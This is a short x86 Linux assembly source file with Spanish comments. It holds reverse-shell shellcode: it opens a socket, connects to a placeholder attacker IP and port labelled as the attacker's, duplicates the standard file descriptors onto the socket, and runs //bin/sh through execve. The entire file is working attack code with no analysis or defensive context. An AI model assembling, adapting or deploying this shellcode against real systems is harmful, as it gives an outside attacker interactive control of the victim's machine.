global _start			

section .text
_start:
	xor    eax,eax
	xor    ebx,ebx
	xor    ecx,ecx
 	xor    edx,edx
	mov    al,0x66		; Invocar a la systemcall _socketcall
	mov    bl,0x1		; Invocar a socket()
	push   ecx
	push   0x6
	push   0x1		;SOCK_STREAM
	push   0x2		;AF_INET
 	mov    ecx,esp
	int    0x80

	mov    esi,eax		;Obtenemos el descriptor del socket
	mov    al,0x66  	; Invocar a la systemcall _socketcall
	xor    ebx,ebx
	mov    bl,0x2
	push   0xeeeeeeee	;IP Address del atacante
	push   0xdddddddd		;Puerto del atacante
	push   bx
	inc    bl
	mov    ecx,esp
	push   0x10
	push   ecx
	push   esi
	mov    ecx,esp
	int    0x80
	
	xor    ecx,ecx
	mov    cl,0x3
	dupfd:
		dec    cl
		mov    al,0x3f
		int    0x80
		jne    dupfd
	xor    eax,eax
	push   edx
	push   0x68732f6e
	push   0x69622f2f
	mov    ebx,esp
	push   edx
	push   ebx
	mov    ecx,esp
	push   edx
	mov    edx,esp
	mov    al,0xb
	int    0x80
